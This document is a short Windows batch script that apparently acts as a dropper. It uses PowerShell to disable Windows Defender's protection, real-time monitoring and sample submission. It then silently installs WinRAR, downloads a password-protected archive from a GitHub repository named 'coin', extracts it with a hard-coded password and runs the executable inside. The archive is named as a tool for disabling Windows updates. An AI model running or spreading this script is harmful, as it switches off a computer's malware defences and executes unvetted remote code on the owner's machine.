@echo off
powershell -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1"
powershell -NoProfile -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2"
powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'"
powershell -NoProfile -Command "Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs"
powershell -NoProfile -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/main/Disable-update-windows.rar -OutFile C:\Disable-update-windows.rar"
powershell -NoProfile -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -pPITVN -ibck -y 'C:\Disable-update-windows.rar' 'C:\'"
powershell -NoProfile -Command "Start-Sleep -Seconds 2"
powershell -NoProfile -Command "& 'C:\Disable-update-windows\Wub_x64.exe'"
exit